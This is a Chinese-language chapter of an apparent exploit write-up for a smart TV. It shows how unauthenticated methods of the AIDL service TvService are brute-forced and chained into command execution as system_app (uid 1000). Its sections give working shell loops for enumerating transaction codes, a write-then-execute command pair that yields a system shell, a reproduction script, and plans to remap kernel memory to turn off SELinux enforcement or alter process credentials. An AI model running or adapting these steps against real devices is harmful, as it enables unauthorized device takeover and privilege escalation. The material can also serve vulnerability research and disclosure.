# 07 — TvService AIDL 突破：从 Binder 到 `system_app` 命令执行

> 本节是整条链里**最有价值的一步**。它把攻击面从"受限 root 域 `misysdiagnose`"
> 扩展到了 Android 里正常的系统应用域 `u:r:system_app:s0`（uid 1000）。

## 1. 起因

阶段 2–4 用的是 `TvService.transact(4400)` 这个**非 AIDL 的裸事务码**。
但 `bin1.txt` 里的 `service list` 给出了更有意思的信息：

```
2   TvService: [mitv.internal.ITvService]
```

`TvService` 实现的是**标准 AIDL 接口** `mitv.internal.ITvService`。
而它的实现类 `TvServiceDefaultImpl extends ITvService.Stub`：

* 是一个**几十个方法的巨型接口**；
* 关键方法**没有任何 `checkCallingPermission` / `enforceCallingUid` 校验**；
* `onTransact` 末尾有 `super.onTransact(...)` 兜底 —— 也就是说
  **只要 AIDL 里声明了的事务码，从 adb shell 就能直接调**。

## 2. 用"存在性 oracle"爆破事务码

`service call` 对**不存在**的事务码返回固定错误：

```
$ adb shell 'service call TvService 99999'
Result: Parcel( ... 'N.o.t. .a. .d.a.t.a. .m.e.s.s.a.g.e.' ... )
```

而**存在**的事务码会返回真实数据 / 抛业务异常 / 打日志。
于是用一行 shell 就能枚举全部合法事务码。

进一步用**三路副作用 oracle** 定位"危险方法"——同时用三种参数形态扫码，
然后去查三种副作用是否发生：

```bash
# a) 属性写入型：systemPropertiesSet(key, value)
for N in $(seq 1 130); do service call TvService $N s16 "probe.p$N" s16 "VAL$N"; done
# b) 命令执行型：runSystemCommand(cmd)
for N in $(seq 1 130); do service call TvService $N s16 "setprop probe.c$N 1"; done
# c) 文件写入型：writeSystemFile(path, content)
for N in $(seq 1 130); do service call TvService $N s16 "/sdcard/probe_w$N" s16 "MARKER"; done

# 检查痕迹
getprop | grep '\[probe\.'        # 命中 a)
ls -la /sdcard/probe_w*           # 命中 c)
```

## 3. 结果：三条无鉴权通道

| code | AIDL 方法 | 语义 | 危险度 |
|---|---|---|---|
| **1** | `systemPropertiesSet(String key, String value)` | 写任意系统属性 | 🟠 受 `property_service` SELinux 限制 |
| **2** | `writeSystemFile(String path, String content)` | **任意路径写文件**（system_app / uid 1000 权限） | 🔴 高 |
| **3** | `runSystemCommand(String cmd)` | **任意命令执行**（无 shell，按空格分词直接 `Runtime.exec`） | 🔴🔴 最高 |
| 4400 | （非 AIDL）`vendor.misysdiagnose.cmd.code` 属性写 | 触发 **uid 0** 执行脚本（阶段 4） | 🔴🔴🔴 |

证据（logcat 中被 `SystemProperties` / `ITvService$Stub` 打出的行）：

```
ITvService$Stub: onTransact code=1    -> systemPropertiesSet
ITvService$Stub: onTransact code=2    -> writeSystemFile
ITvService$Stub: onTransact code=3    -> runSystemCommand
```

对应 smali 位置：`ITvService$Stub.onTransact` 的 **468 / 764 / 799 / 1349**。

## 4. 立刻验证：拿到 `system_app` shell

```bash
# 写一个脚本（用 writeSystemFile，code=2）
adb shell 'service call TvService 2 s16 "/sdcard/s.sh" s16 "id > /sdcard/sid.txt 2>&1; getenforce > /sdcard/senf.txt 2>&1"'
# 执行它（用 runSystemCommand，code=3）
adb shell 'service call TvService 3 s16 "/system/bin/sh /sdcard/s.sh"'

adb shell 'cat /sdcard/senf.txt'      # => Enforcing
adb shell 'cat /sdcard/sid.txt'       # => uid=1000(system)
```

一键执行器见 [`../tools/sysapp.sh`](../tools/sysapp.sh)：

```bash
./tools/sysapp.sh 'id'
# uid=1000(system) gid=1000(system) ... context=u:r:system_app:s0
```

## 5. 为什么 `system_app` 比 `misysdiagnose` 更有价值

| | `u:r:misysdiagnose:s0`（阶段 4） | `u:r:system_app:s0`（本节） |
|---|---|---|
| uid | 0（全部 38 个 capability） | 1000 |
| 能否 binder → system_server | ✅ | ✅（本来就有） |
| MStar 私有设备节点 | ❌ 全部拒绝 | ✅ **`/dev/miomap`、`/dev/malloc`、`/dev/system`、`/dev/msmailbox`、`/dev/scaler`、`/dev/semutex` 均 ioctl+map** |
| `/proc/utopia` | ❌ | ✅ **ioctl + read + write + map** |
| `/proc/cmdline` | 只读 | ✅ **可写** |
| `/dev/mma` | ✅ ioctl/rw | ✅ 也允许 |
| 能否执行自研二进制 | ✅（`/data/diagnosis`） | ✅ **（`system_app_data_file` 有 `execute`）** |

关键在最后一行 —— 见 [`08-system-app-execution.md`](08-system-app-execution.md)：
**`system_app` 有 `execute` 权限的文件类型只有两个**，其中一个恰好是
**我们自己能创建的目录**。

## 6. 复现脚本

```bash
# 枚举所有合法事务码
adb shell 'for i in $(seq 1 300); do \
  r=$(service call TvService $i 2>&1); \
  case "$r" in *"Not a data message"*) ;; *) echo "EXIST $i";; esac; done'
```

> ⚠️ **注意**：不要连续扫到把 `TvService` 打崩为止（实测 code ≈ 82 会让它死掉，
> 由 init 自动重启）。**只扫需要的段，并给每次调用留间隔。**

## 7. 结论

到这里为止，我们在这台电视上**同时**拥有：

1. `u:r:misysdiagnose:s0` + uid 0 + 全部 capability（受限域）；
2. `u:r:system_app:s0` + uid 1000（正常系统应用域，能碰 MStar 全部私有设备）；
3. 两者都可用**纯 adb shell + `service call`** 触发，不需要任何前置漏洞。

下一步（见 [`../docs/06-next-steps.md`](../docs/06-next-steps.md)）是在
`system_app` 域里**执行自研原生二进制**，去打开 `/dev/miomap` 等内存映射设备，
尝试拿到「用户态 ↔ 任意物理地址」的映射，从而直接改写内核里的
`selinux_state.enforcing` 或自身 `cred->security->sid`。
